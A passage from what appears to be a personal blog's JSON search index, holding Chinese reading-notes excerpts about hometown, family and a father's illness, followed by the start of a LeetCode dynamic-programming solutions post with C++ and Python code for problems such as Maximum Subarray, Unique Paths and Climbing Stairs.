除非死心，除非让心睡去。怀着死掉的、睡不着的心，皮囊就仅仅是皮囊。 哪一个中国人真的向往过冰冷的天堂。哪一不是希望回到认识，希望把经过的再过一遍。 但这一遍和那一遍是不同的，就像醒着和睡着不同。 写作就是再过一遍。 过一遍自己，也试着过一遍别他人。 把栏杆拍遍，把心再伤一遍。 他站在这里，艰难的扪心而说。 但每次看到她不甚明白的笑，展开那岁月雕刻出的层层叠叠的皱纹，我就莫名其妙的释然了许多。 我知道她在哪个角落拼命平复内心的波澜。 脸涨得通红，眼眶盈满了泪，却始终不让其中任何一滴流出来。 “真的没事？”嘴巴不断的撇着，像是抑制不住情绪的小孩。 到处是拆掉一半的房子，这些房子外面布着木架和防尘网，就像包扎的纱布。 我想象着，那一座座房子里住着的不同的故事，多少人过去的影子在这里影影绰绰，昨日的悲与喜还在那停留，想象着，它们终究变成一片尘土飞扬的废墟。 我知道，其实自己的内心也如同这小镇一样：以发展、以未来、以更美好的名义，内心的各种秩序太仓促太容易被重新规划，摧毁，重新建起，然后我再也回不去，无论是现实的小镇，还是内心以前曾认定的种种美好。 然后，我看见那笑容就这么一点点地在她脸上绽放开，这满是皱纹的脸突然透露出羞涩的容光。我像摸小孩一样，摸摸母亲的头，心里想，这可爱的母亲啊。 用尽各种办法让自己快乐吧，你们这群无家可归的孤魂野鬼。 然后独自庆幸的想，我的母亲以及正在修建的那座房子。 我知道，即使那房子终究被拆了，即使我有一段时间里买不起北京的房子，但我知道，我这一辈子，都有家可回。 像是电视里的中奖节目，好不容易到了最后一关，最终要开奖前的那种表情。母亲一路上边捂着自己的眼睛，边往店里走。 虽然知道根本不是台风的错。那结局是注定的，生活中的很多事情，该来的会来，不以这种形式，就会以那样的形式，但事情简单归咎于我们无能为力的某个点，会让我们的内心可以稍微自我安慰一下，所以，我至今仍愿意诅咒那次台风。 闽南多台风，这不是什么新奇的事情。通常每次台风警报，大家就忙着修修补补，把能固定的东西固定住，有漏洞的地方填上，然后关着门窗，用一个晚上，听那巨兽在你的屋顶、窗前不断地玩闹，听着它用它的气息把你完全包裹住，却不会伤到你半分。只要你不开门，一切似乎和你无关。它就像是老天爷一年几次给闽南人民上演的4D立体电影。 当时风也干净，雨也干净，不像如今，沾染了一点雨，就要怕化学污染。 我可以看到，挫败感从那一个个细微的点开始滋长，终于长成一支军队，一部分一部分攻陷他。 没有声息，但他的内心里某些东西确实完全破碎了。这声音听不见，但却真实地弥漫开。而且还带着味道，咸咸的，飘浮在家里，仿佛海水的蒸汽一般。 他躺在床上，仿佛生下来就应该在那儿。 疾病彻底击垮他了。他就像是一个等待着随时被拉到行刑场的战俘，已经接受了呼之欲出的命运。 这种绝望反而也释放了他。 这是四年一度全世界的狂欢，他们没有人知道，这一天，我生命中最重要的一个人不见了。 我哭不出来，一直握着父亲的手。 我记得那是条长长的走廊，大理石铺就，再柔软的脚步踩踏上去，都会听到厚重的回声。声音堆堆叠叠，来回在走廊里滚动。冷色的灯光静静地敷在上面，显得走廊更长，更深了。 每个房间的门口，都挂着他们相聚在此的理由：心血管、脑外科……疾病掌管着这里，疾病就是这里的规则，疾病也是这里的身份。 无论他们是谁做过什么，可能刚从一台典礼中被请下来，又或者刚插完秧坐在田埂休息一下，醒来，他们就在这里。 疾病在不同的地方找到了他们，即使他们当时身处不同的生活，但疾病一眼看出他们共同的地方，统一把他们赶到这么一个地方圈养。 在这里，灵与肉的差别第一次这么清晰。在这里，他们第一次像尊重自己的情感和灵魂一样，那么尊重自己的肉身。 —死亡不是疾病的目的，疾病是尽可能占有身体，用自己的秩序统治那身体。所以简单的死和简单的创伤都是最低级的疾病。 我知道那是双痛彻后的眼睛，是被眼泪洗干净的眼睛。因为，那种眼睛我也有。 无论当时多么交心，那些亲属也不会愿意再在尘世见到她。 我一个人默默搭着电梯，走到楼下。燃放烟花的痕迹还在那，灰灰的，像一层淡淡的纱。 我知道过不了几天，风一吹，沙子一埋，这痕迹也会不见的。 一切轻薄得，好像从来没发生过。 让母亲在这个家庭中坚定理性主义的，其实和那一切政治教育无关，她只是因为饥饿，她不相信真正慈爱的神灵会撒手不帮她无助的家人。 香港阿小给这群野生的孩子内心，造成了极大的触动，或许印第安人第一次看到欧洲人也是如此心情。 老师说，别想着玩，想想未来住在大城市里，行走在高楼大厦间，那里才好玩。 他们偶尔还会举例： 某某同学，考上了北京的大学，然后，他就住在北京了…… 口气笃定得好似王子和公主从此过上幸福的生活。 硕大的城市，充满灼感的生活，每次走在地铁拥挤的人群里，我总会觉得自己要被吞噬，觉得人怎么都这么渺小。而在小镇，每个人都那么复杂而有生趣，觉得人才像人。 车继续往城外开，灯火慢慢稀疏。 车依然在开，那座桥漫长得似乎没有尽头。桥上一点点的灯影，快速滑过。一明一灭，掩映着车里晃动着的疲倦人群。 大部分人都困倦的睡着了——他们都是一早七点准时在家门口等着这车到市区，他们出发前各自化妆，精心穿着，等着到这城市的各个角落，扮演起维修工、洗碗工、电器行销售、美发店小弟……时间一到，又仓皇地一路小跑赶这趟车，搭一两个小时回所谓的家，准备第二天的演出。 他们都是这城市的组成部分。而这城市，曾经是我们在小镇以为的，最美的天堂。他们是我们曾经以为的，活在天堂里的人。 这样的人，还因为出身，总可以嗅到他们身上的泥土味。这使得他们的理想粗暴却淳朴，让人感觉不到野心勃勃或者城市孩子般的精明，我乐于和这样的人交朋友，就如同喜欢某种精致的土特产一般。 但她不敢把这不安说出口，似乎一说出口，一切就清晰可见，一切担心就落地为实了。 出远门工作，反而让我明白自己确实是个恋家的人。 我才明白，那封信里，我向文展说的“小时候的玩伴真该一起聚聚了”，真是个天真的提议。每个人都已经过上不同的生活，不同的生活让许多人在这个时空里没法相处在共同的状态中，除非等彼此都老了，年迈再次抹去其他，构成我们每个人最重要的标志，或许那时候的聚会才能成真。 这房子，我也十几年没进来了。它果然是记忆中的那个样子，但又不仅仅是那个样子，就如同一张没对焦好的照片，一旦清晰起来，大概的模样还是如此，只是每部分的景致，完全颠覆了此前的感觉。它比我记忆中小，土墙斑斑驳驳、老气沉沉，还飘散着一股发霉的味道。 我没有预料到，他竟然沉默了。而且这一沉默，不像我想象的，只是一个小小的、可以逾越、可以熬过的间歇。他冷漠地坐在那，任由沉默如同洪水汩汩淌来，一层层铺来，慢慢要把人给吞没了。 又或许，是因为我知道，从本质意义上，我们都是既失去家乡又永远没办法抵达远方的人。 他很用力的打招呼，很用力的介绍自己。看到活得这么用力的人，我总会不舒服，仿佛对方在时时提醒我要思考如何生活。 任何不合时宜的想象都是不需要的，因为现实世界只有一个。 这很难，就像火箭发射后，在高空必须完成的一次顶点推送一样。 在迅速城市化的这个国家里，似乎每个人都在急着进入对时尚生活的想象，投入地模仿着他们想象中的样子。这些社团或许更准确的描述还可以使——通过假装弹吉他，跳街舞，写诗歌来集体自我催眠，以为自己变得现代、时尚的邪教组织。 他以为自己做着摧毁一切规矩的事情，但其实一直活在规矩里。我以为自己战战兢兢地以活在规矩里为生活方式，但其实却对规矩有着彻底摧毁的欲望。 不要看一个人的出身，而要看一个人的可能性。 只是这样的宣誓，没有从心里透出来的力气，让人听了，反而感觉到无法言说的虚弱。 厚朴这几年一直活在对梦想的虚幻想象中，而不是切实的现实里。我没把握，当他看到梦想背后那芜杂、繁琐的要求时，是否会有耐心，是否具有能力，是否能哟足够的接受度——梦想原来是卑微的执着。 厚朴，或许能真实地抵达这个世界的，能确切抵达梦想的，不是不顾一切投入想象的狂热， 而是务实、谦卑的，甚至你自己都看不起的可怜的隐忍。 他不知道，最离奇的理想所需要的建筑素材就是一个个庸常而枯燥的努力。 他知道自己再也没有能力，组织起他能想象到瑰丽生活去与现实抗衡，所以唯一的办法，就是紧张、敏感地去抗拒一切质疑和暗示。 然而生活必须继续，就像是个话剧演员，我必须在中场休息时间结束后，继续扮演起在现实生活中苦苦争取来的角色。 事实上我和许多同学说不上熟悉，只是偶尔说说一些陈年旧事和另外一个共同认识的人的故事，勉强证明，我们为什么还要在彼此的身上花时间的原因。 大学四年，毕业工作两年，我一直控制着自己，没学会抽烟，没学会喝酒，没让自己学会发泄情绪的一切极端方式。要确保对自己的一切控制，要确保对某种想象的未来达成，要确保自己能准确地活在通往目标的那个程序里。 不想哭，内心憋闷得难受，只能在租住的不到十平方米的房间内，不断来来回回的到处走，然后不断深深地、长长地叹气。仿佛我的胸口淤积着一个发酵出浓郁沼气的沼泽，淤积着一个被人拼命咀嚼，但终究没能被消化，黏糊成一团的整个世界。 也就是在那时候，我突然察觉，或许我也是个来北京看病的人。 或许，我和厚朴生的是同一种病。 我看到，这海水之上那碎银一样的阳光，铺满我的瞳孔。 那就是坐在海边，享受着海风亲昵的抚摸，享受着包裹住我的庞大的湛蓝——那种你似乎一个人但又不孤独的安宁。再长大一点，我还喜欢骑着摩托车，沿着海岸线一直兜风。 每片海，沉浮着不同的景致，也翻滚着各自的危险。生活也是，人的欲望也是。以前以为节制或者自我用逻辑框住，甚至掩耳盗铃地掩藏着，是最好的方法，然而，无论如何，它终究永远在那躁动起伏。 我期许自己要活得更真实也更诚实，要更接受甚至喜欢自己身上起伏的每部分，才能更喜欢这世界。我希望自己懂得处理，欣赏各种欲求，各种人性的丑陋与美妙，找到和它们相处的最好方式。我也希望自己把这一路看到的风景，最终能全部用审美的笔触表达出来。 我一定要找到和每片海相处的距离，找到欣赏它们的最好方式。 中国近代的城市不是长出来的，不是培植出来的，不是催生出来的，而是一种安排。 我一直觉得有生命里的地方在于浑浊。一潭子里的水和放在观景台上的水，永远是池子丰富也美丽。就一个池子，它里面的各种生物以及各种生活在这世界的故事都可以让一个孩子开心一个下午，而城市里的孩子只能盯着被安排好的景色开心这么一瞬间。 但你在一个角落住一个星期，你就知道这个城市其他所有地方的样子了——都是类似的。 我常这么比喻，厦门是泉州的整容版。在泉州你会看到乱闯的行人和车，粗糙的老建筑，甚至低陋的生活习俗。我是会喜欢环岛路上的精致风景，但绝不是被打动或者感动。感动我的，会是走在泉州石头巷子里突然听到随便哪户人家里飘出的悲戚的南音，会是十五佛生日的时候，整个城市家家户户在门口摆上供品烧上香齐声祈祷平安。 他想说的是，在不知道怎么生活的情况下，我会采取的是一种现成的、狭隘的、充满功利而且市侩的逻辑——怎么能尽快挣钱以及怎么能尽量成名，用好听的词汇就是所谓的“梦想”和“责任”。 我，或许许多人，都在不知道如何生活的情况下，往往采用最容易掩饰或者最常用的借口——理想或者责任。 我真想好好和你聊聊，关于我们要怎么享受生活，而不是如何让虚妄的梦想膨胀自己。我真的太想和你谈谈，什么才是我们最应该珍惜和最珍贵的。 原谅我，父亲，从你生病开始我就一直忙于在外面兼职赚钱，以为这样就能让你幸福，但当我看到我给你唯一一张照片，被你摸到都已经发白的时候，才知道自己恰恰剥夺了我能所给你的、最好的东西。 我不是哭泣，而是满肚子怒气，我憎恨自己再无法为父亲做点什么。亏欠得太多却没机会补偿，这是于我最无法接受的事情。 那一刻我会觉得自己是切开木头年轮中的某一环，拥挤得那么心安。 我相信很多闽南人、老华侨都如同我这样生活。累死累活地奔波，就是为了体面地回家。 家里有什么呢？ 有几次遇到挫折，万水千山赶回老家，待了几天，就开始好奇自己的冲动。冷静的时候，我确实会看到，这个小镇平凡无奇，建筑乱七八糟没有规划，许多房子下面是石头，上面加盖着钢筋水泥。那片红色砖头的华侨房里，突然夹着干打垒堆成的土房子；而那边房子的屋顶，有外来的打工仔在上面的养鸭。 那几条我特别喜欢的石板路，其实一遇到雨水就特别容易滑倒，好不容易走着觉得有了浪漫的已经，却突然接上一条水泥地。它到处是庙宇，每座庙宇都蔓延着那醇厚的沉香，然而周围加工厂的废气味，却也总在你沉醉的时候，突然袭击。 我知道那种舒服，我认识这里的每块石头，这里的每块石头也认识我；我知道这里的每个角落，怎么被岁月堆积成现在这样的光景，这里的每个角落也知道我，如何被时间滋长出这样的模样。 从小我就喜欢闻泥土的味道。 是很美啊，那是片我至今不知道名字的海滩，海那边漂浮着几条大大的船，一群海鸟轻盈地掠过天际，我是可以躺在这里一个下午，如果这是我的家的话，然而，我实在抑制不住内心的恐慌：为什么这里的风这么大？为什么这里的沙子那么干涩？为什么看不到我熟悉的那些石头。我恐慌的到处寻找，才终于看到，那条湿润的小巷子温暖地在不远的地方等我。 我高兴地一路狂跑，似乎后面有什么在追着我，边跑边哭，边跑边笑，终于跑到家里，敲了敲木头门，开门的是母亲。母亲并不知道我那下午的历险，看着灰头土脸、泪流满面的我，并不追问，也没责骂，把木头门推得更开一点，说，干嘛？怎么还不进来？ 我用尽最后一丝力气往往家里跑，厨房的油烟、木头的潮湿、狗的臭味它们全部涌上来，环抱住我。那一刻，我知道，我回家了，干脆就躺倒满是灰尘的地上去了…… 醒来后，才发现自己竟然不争气的哭了。或许，这几年我其实还是没离开过家乡，只不过，走得更远了一点，看的风景更多了一点，也怕的更厉害一点。但还好，我终于还是回来了，我终于还是能回来，我终于还是可以找到永远属于我的那条小巷。 我在海边上车，一路被带向浓郁的山色。窗外的景致，如同溪流中的光影那般鲜润地滑走，我看着一座座的房子在我眼光中迅速到来，却仓促被扯走。我在破旧的院子里，看到老人抱着孙女哭泣；我看到一个男人，坐在门墩上抽烟；我看到一个小女生，背着书包盯着一所房子的大门犹豫——然后一切全部被列车的行进拉扯开。 我就这样短暂参与了他们的生活，刚开始铺张关于他们命运的想象，却又被迅速带离。当暮色渲染了整个视野，轰轰的火车把我拉出城镇，目光可见的，只有模糊山色中零星的灯光，橘色的夕阳下，缎子一样的河流，以及孩子影影绰绰的嬉闹。 快速的一切都可以成为风景，无论当事者多么惊心动魄。 工作中作为记者，一个记录着者，我所要做的，像是一个好事的看客，迅速挤进众多人围观的某个故事现场，尝试被卷进去其中的喜怒，然后一次次狠心的抽离。 生活中，我一直尝试着旅客的心态，我一次次看着列车窗外的人，以及他们的生活迎面而来，然后狂啸而过，我一次次告诉自己要不为所动，因为你无法阻止这窗外故事的逝去，而且他们注定要逝去。我真以为，自己已经很胜任旅客这一角色，已经学会了淡然，已经可以把这种旅游过成生活。 时光多残忍，那个懦弱但可爱的父亲，兢兢业业一辈子的所有印记一点都不剩下；那个过于狂热、战天斗地的兄长成刚，短暂地燃烧生命，也就耀眼那一瞬间；而我深爱着的，那个石头一样坚硬的阿泰，还是被轻易地抹去。太多人的一生，被抹除得这么迅速、干净。他们被时光抛下列车，迅速得看不到一点踪影，我找不到他们的一点气息，甚至让我凭吊的地方也没有。 而对于还在那列车中的我，再怎么声嘶力竭都没用，其中好几次，我真想打破那玻璃，停下来，亲吻那个我想亲吻的人，拥抱着那些我不愿意离开的人。但我如何地反抗，一切都是徒然。 我才明白，我此前并不是接受旅游这种生活方式，我那只是逃避。虽然我反复告诉自己，既然人生真是个旅途，就要学会看风景的心情和能力。但我始终接受不了，活得这么轻盈，轻盈到似乎没活过。其实我并不愿意旅行，其实我更愿意待在一个地方，守着我爱的人，生根发芽。 对那些我正在爱着或者曾经爱过的人，我希望你们明白，我多么希望付出全部为你们停留，如今我唯一能做的，就是把你们刻在我的骨头里，即使时光列车拖着我的肉身一路远行，至少你们的名字和名字牵扯的记忆，被我带走了，这是我对时间能做的唯一反抗。 说实话我一直不理解，也一直像个任性的孩子接受不了，为什么时光这列车一定要开得这么快，为什么还要有各自那么多分岔，我不知道我们这么急匆匆地到底要去向何方？但我知道，或许不仅是我一个人在大呼小叫，那些静默的人，内心里肯定和我一样地潮汐。我不相信成熟能让我们接受任何东西，成熟只是让我们更加自欺欺人。 原谅我这么感伤，那是因为，不仅是过去，现在的我，多想挽留住自己最珍贵的东西，却一次次无能为力。但我还是愿意，这么孩子气地倔强抗争，我多么希望能和我珍惜的人一路同行，但我也明白，我现在唯一能努力的是，即使彼此错身了，我希望，至少我们都是彼此曾经最美的风景——这也是我能想到的唯一反抗。 当时的父亲应该也和三十岁的我一样，已经度过了人生的懵懂期。世界已经帮他剔除掉天真的虚妄，岁月也悄悄开始把他的脸捏出折痕，当时的他应该已经和真实的世界迎面撞上。他是否已经找到办法和自己身上的欲望讲和？他如何理解这个朝他的人生扑面而来的新生命？后来的命运如何潜伏在父亲周围，然后一点点把他最终捕获…… 我才发觉，我其实不认识父亲，即使我们是彼此生命中最重要的部分。严格来说，我只是知道他的人生，只是知道他作为父亲这一角色在我的生活中参与的故事，我没有真正地看见并理解他。 我常对朋友说，理解是对他人最大的善举。当你坐在一个人面前，听他开口说话，看得到各种复杂、精密的境况和命运，如何最终雕刻出这样的性格、思想、做法、长相，这才是理解。而有了这样的眼睛，你才算真正“看见”那个人，也才会发觉，这世界最美的风景，是一个个活出各自模样和体系的人。 我在那时候才恍惚明白写作的意义——写作不仅仅是种技能，是表达，而更是让自己和他人“看见”更多人、看见“世界”的更多可能、让每个人的人生体验尽可能完整的路径。 我自以为已经积累了足够的笔力，可以面对自我，面对我在乎的一切人。 然而当我真正动笔时，才发觉，这无疑像一个医生，最终把手术刀划向自己。写别人时，可以模拟对象的痛感，但最终不用承担。而在写这本书时，每一笔每一刀的痛楚，都可以通过我敲打的一个字句，直接、完整地传达到我的内心。","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"读书笔记","slug":"study/读书笔记","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Book","slug":"Book","permalink":"https://www.hrwhisper.me/tags/Book/"},{"name":"reading notes","slug":"reading-notes","permalink":"https://www.hrwhisper.me/tags/reading-notes/"}]},{"title":"leetcode 动态规划（DP）","slug":"leetcode-dynamic-programming","date":"2015-03-08T03:04:16.000Z","updated":"2020-11-29T11:54:28.382Z","comments":true,"path":"leetcode-dynamic-programming/","link":"","permalink":"https://www.hrwhisper.me/leetcode-dynamic-programming/","excerpt":"本次题解包括 53. Maximum Subarray 62. Unique Paths 63. Unique Paths II 64. Minimum Path Sum 70. Climbing Stairs 72. Edit Distance 87. Scramble String 91 . Decode Ways 97. Interleaving String 115 Distinct Subsequences 120. Triangle 139. Word Break 140. Word Break II 152. Maximum Product Subarray 174 . Dungeon Game 198. House Robber 213 . House Robber II 221 . Maximal Square 712. Minimum ASCII Delete Sum for Two Strings 718. Maximum Length of Repeated Subarray 799. Champagne Tower 818. Race Car","text":"本次题解包括 53. Maximum Subarray 62. Unique Paths 63. Unique Paths II 64. Minimum Path Sum 70. Climbing Stairs 72. Edit Distance 87. Scramble String 91 . Decode Ways 97. Interleaving String 115 Distinct Subsequences 120. Triangle 139. Word Break 140. Word Break II 152. Maximum Product Subarray 174 . Dungeon Game 198. House Robber 213 . House Robber II 221 . Maximal Square 712. Minimum ASCII Delete Sum for Two Strings 718. Maximum Length of Repeated Subarray 799. Champagne Tower 818. Race Car 53. Maximum Subarray Find the contiguous subarray within an array (containing at least one number) which has the largest sum. For example, given the array [-2,1,-3,4,-1,2,1,-5,4], the contiguous subarray [4,-1,2,1] has the largest sum = 6. More practice: If you have figured out the O(n) solution, try coding another solution using the divide and conquer approach, which is more subtle. 题目地址：leetcode Maximum Subarray 题目大意：给定一串数字，要求求出连续的序列，使得这个连续序列的和最大 水水的DP~ 当前和为sum,如果sum &gt;0,那么加上当前元素，否则sum=A[i] （即抛弃负数的sum，重新开始。因为负数的sum是累赘- -好难听的样子） C++ 1234567891011121314class Solution &#123;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; int cur = 0, ans = nums[0]; for(int i = 0; i &lt; nums.size(); ++i)&#123; cur += nums[i]; if(cur &gt; ans) ans = cur; if(cur &lt; 0) cur = 0; &#125; return ans; &#125;&#125;; Python 1234567891011121314class Solution(object): def maxSubArray(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; ans, cur = nums[0], 0 for x in nums: cur += x if cur &gt; ans: ans = cur if cur &lt; 0: cur = 0 return ans 分治法 《编程珠玑》里其实有讲过。 最大值要么在左边要么在中间，还有就是中间的情况 左右两边可以递归没什么好说的。 中间的就是从mid到left找最大的left_sum，以及从mid+1到right找最大的right_sum，就是left_sum + right_sum C++ 123456789101112131415161718192021222324252627class Solution &#123; int divide_and_conquer(int l, int r, const vector&lt;int&gt; &amp;nums) &#123; if (l == r) return nums[l]; int mid = (l + r) &gt;&gt; 1; int left = INT_MIN, right = left; int cur = 0; for (int i = mid; i &gt;= l; --i) &#123; cur += nums[i]; if (cur &gt; left) left = cur; &#125; cur = 0; for (int i = mid + 1; i &lt;= r; ++i) &#123; cur += nums[i]; if (cur &gt; right) right = cur; &#125; return max(left + right, max(divide_and_conquer(l,mid,nums), divide_and_conquer(mid + 1, r, nums))); &#125;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; return divide_and_conquer(0, nums.size() - 1, nums); &#125;&#125;; 62. Unique Paths A robot is located at the top-left corner of a m x n grid (marked 'Start' in the diagram below). The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked 'Finish' in the diagram below). How many possible unique paths are there? Above is a 3 x 7 grid. How many possible unique paths are there? Note:_m_ and n will be at most 100. 题目地址：leetcode Unique Paths 题目大意: :从m*n大小的图中左上方走到右下方，每次只能向右或者向下，问一共有多少种走法 思路： 设dp[i][j]为到坐标为（i,j）的方法数，则有dp[i][j]= dp[i-1][j]+dp[i][j-1] 水~ 这是看了discuss里面，有人用数学方法做的。 orz 原文如下: It's true that this can be solved with dynamic programming. But you can see that every path has exactly m - 1 horizontal moves and n - 1 vertical moves. So, to get a particular path, you need to choose where to put your m - 1 horizontal moves (or your n - 1 vertical moves) amongst the m + n - 2 total moves. That gives (m+n-2 choose m-1) paths (or (m+n-2 choose n-1), which is the same). C++ 12345678910111213class Solution &#123;public: int uniquePaths(int m, int n) &#123; vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); for(int i = 0; i &lt; n; ++i) dp[0][i] = 1; for(int i = 0; i &lt; m; ++i) dp[i][0] = 1; for(int i = 1; i &lt; m; ++i) for(int j = 1; j &lt; n; ++j) dp[i][j] = dp[i - 1][j] + dp[i][j - 1]; return dp[m - 1][n - 1]; &#125;&#125;; Python方法1 12345678910class Solution: # @return an integer def uniquePaths(self, m, n): dp &#x3D;[[0 for i in range(n+1)] for i in range(m+1)] for i in range(1,n+1): dp[1][i] &#x3D; 1 for i in range(2,m+1): for j in range(1,n+1): dp[i][j]&#x3D;dp[i-1][j]+dp[i][j-1] return dp[m][n] Python 方法2 1234class Solution: # @return an integer def uniquePaths(self, m, n): return math.factorial(m+n-2)&#x2F;(math.factorial(n-1)*math.factorial(m-1)) 63. Unique Paths II Follow up for \"Unique Paths\": Now consider if some obstacles are added to the grids. How many unique paths would there be? An obstacle and empty space is marked as 1 and 0 respectively in the grid. For example, There is one obstacle in the middle of a 3x3 grid as illustrated below. 123456[ [0,0,0], [0,1,0], [0,0,0]] The total number of unique paths is 2. Note:_m_ and n will be at most 100. 题目地址：leetcode Unique Paths II 题目大意: 和上面一题差不多，都是要求从左上角到右下角的方法数，只不过这题有障碍物，有障碍物的不能走。 思路：还是dp，就稍微改下即可。 设dp[i][j]为到坐标为（i,j）的方法数。对于(i,j): (i,j)为障碍物，则dp[i][j]=0 (i,j)不为障碍物则 dp[i][j]= dp[i-1][j]+dp[i][j-1] C++ 123456789101112131415161718class Solution &#123;public: int uniquePathsWithObstacles(vector&lt;vector&lt;int&gt;&gt;&amp; obstacleGrid) &#123; if(obstacleGrid.empty() obstacleGrid[0].empty()) return 0; int m = obstacleGrid.size(), n = obstacleGrid[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); dp[0][0] = obstacleGrid[0][0] ^ 1; for(int i = 1; i &lt; n; ++i) dp[0][i] = dp[0][i - 1] &amp; (!obstacleGrid[0][i]); for(int i = 1; i &lt; m; ++i) dp[i][0] = dp[i - 1][0] &amp; (!obstacleGrid[i][0]); for(int i = 1; i &lt; m; ++i) for(int j = 1; j &lt; n; ++j) dp[i][j] = obstacleGrid[i][j]? 0 : dp[i - 1][j] + dp[i][j - 1]; return dp[m - 1][n - 1]; &#125;&#125;; Python 12345678910111213141516171819class Solution: # @param obstacleGrid, a list of lists of integers # @return an integer def uniquePathsWithObstacles(self, obstacleGrid): m , n = len(obstacleGrid) , len(obstacleGrid[0]) dp = [[0 for x in range(n+1)] for x in range(m+1)] for j in range(1,n+1): if obstacleGrid[0][j-1]: break else: dp[1][j] = 1 for i in range(2,m+1): for j in range(1,n+1): if obstacleGrid[i-1][j-1]: dp[i][j] = 0 else: dp[i][j]=dp[i-1][j]+dp[i][j-1] return dp[m][n] 64. Minimum Path Sum Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path. Note: You can only move either down or right at any point in time. 题目地址：leetcode Minimum Path Sum 题目大意: mn的格子中有mn个非负整数，求从左上角到右下角中，经过的数字和的最小值（每次只能向右或者向下走） 思路:水题，其实和上面的也差不多。继续dp。 设dp[i][j]为当前到达坐标为(i,j)的最小和，dp[i][j]=min(dp[i - 1][j], dp[i][j - 1]) + grid[i ][j ]; 我的版本由于dp数组和grid坐标差了1所以为min(dp[i - 1][j], dp[i][j - 1]) + grid[i - 1][j - 1]; 其实也可以O(N)的空间实现的。 C++ 12345678910111213141516171819class Solution &#123;public: int minPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; if(grid.empty() grid[0].empty()) return 0; int m = grid.size(), n = grid[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); dp[0][0] = grid[0][0]; for(int i = 1; i &lt; n; ++i) dp[0][i] = dp[0][i - 1] + grid[0][i]; for(int i = 1; i &lt; m; ++i) dp[i][0] = dp[i - 1][0] + grid[i][0]; for(int i = 1; i &lt; m; ++i) for(int j = 1; j &lt; n; ++j) dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]; return dp[m - 1][n - 1]; &#125;&#125;; 版本2 123456789101112class Solution &#123;public: int minPathSum(vector&lt;vector&lt;int&gt;&gt; &amp;grid) &#123; int m = grid.size(), n = grid[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(m+1, vector&lt;int&gt;(n+1, 0x7ffffff)); dp[0][1] = dp[1][0] = 0; for (int i = 1; i &lt;= m; i++) for (int j = 1; j &lt;= n; j++) dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i - 1][j - 1]; return dp[m][n]; &#125;&#125;; Python 1234567891011class Solution: # @param grid, a list of lists of integers # @return an integer def minPathSum(self, grid): m , n = len(grid) , len(grid[0]) dp = [[0x7fffffff for x in range(n+1)] for x in range(m+1)] dp[0][1] = dp[1][0] = 0 for i in range(1,m+1): for j in range(1,n+1): dp[i][j]=min(dp[i-1][j],dp[i][j-1])+grid[i-1][j-1] return dp[m][n] 70. Climbing Stairs You are climbing a stair case. It takes n steps to reach to the top. Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top? Note: Given n will be a positive integer. 题目地址：leetcode Climbing Stairs 题目大意: 爬楼梯，每次可以爬一步或者两步，求从1爬到n的方法数 思路：水~ dp[i] = dp[i - 1] + dp[i - 2]; 12345678910111213class Solution &#123;public: int climbStairs(int n) &#123; vector&lt;int&gt; f(n + 1, 0); f[1] = 1; f[2] = 2; f[3] = 3; if(n &lt;= 3) return f[n]; for(int i = 4; i &lt;= n; ++i) f[i] = f[i - 1] + f[i - 2]; return f[n]; &#125;&#125;; 但只需三个变量即可。 C++ 123456789101112class Solution &#123;public: int climbStairs(int n) &#123; int zero = 0, one = 1, two=1; for (int i = 1; i &lt;= n; i++)&#123; two = zero + one; zero = one; one = two; &#125; return two; &#125;&#125;; Python 1234567891011class Solution(object): def climbStairs(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; zero, one, two = 0, 1, 1 for i in range(1, n + 1): two = zero + one zero, one = one, two return two 还可以用矩阵快速幂的方法: 设Q^n如下： \\[Q^n = \\left[ \\begin{matrix} f_{n+1} &amp; f_{n} \\\\ f_{n} &amp; f_{n-1} \\\\ \\end{matrix} \\right] \\\\ 初始值Q^1= \\left[ \\begin{matrix} 1 &amp;1 \\\\ 1 &amp; 0 \\\\ \\end{matrix} \\right] \\\\\\] 可以用数学归纳法证明： \\[\\begin{alignat}{2}Q^k &amp;= \\left[ \\begin{matrix} f_{k+1} &amp; f_{k} \\\\ f_{k} &amp; f_{k-1} \\\\ \\end{matrix} \\right] \\end{alignat}\\] \\[\\begin{alignat}{2}Q^{k+1} &amp;= \\left[ \\begin{matrix} f_{k+1} &amp; f_{k} \\\\ f_{k} &amp; f_{k-1} \\\\ \\end{matrix} \\right] \\left[ \\begin{matrix} 1 &amp;1 \\\\ 1 &amp; 0 \\\\ \\end{matrix} \\right] \\\\&amp; = \\left[ \\begin{matrix} f_{k+1}+f_{k} &amp;f_{k+1} \\\\ f_{k+1} &amp; f_{k} \\\\ \\end{matrix} \\right] \\\\&amp; = \\left[ \\begin{matrix} f_{k+2} &amp;f_{k+1} \\\\ f_{k+1} &amp; f_{k} \\\\ \\end{matrix} \\right] \\end{alignat}\\] C++ 复杂度O(Logn) 1234567891011121314151617181920212223class Solution &#123;public: int climbStairs(int n) &#123; vector&lt;vector&lt;int&gt;&gt; f = &#123;&#123;1, 1&#125;, &#123;1, 0&#125;&#125;; vector&lt;vector&lt;int&gt;&gt; ans(f); while(n)&#123; if(n &amp; 1) ans = mul(ans, f); f = mul(f, f); n &gt;&gt;= 1; &#125; return ans[0][1]; &#125; vector&lt;vector&lt;int&gt;&gt; mul(const vector&lt;vector&lt;int&gt;&gt; &amp;a, const vector&lt;vector&lt;int&gt;&gt; &amp;b)&#123; vector&lt;vector&lt;int&gt;&gt; res(a.size(), vector&lt;int&gt;(b[0].size(), 0)); for(int i = 0; i &lt; 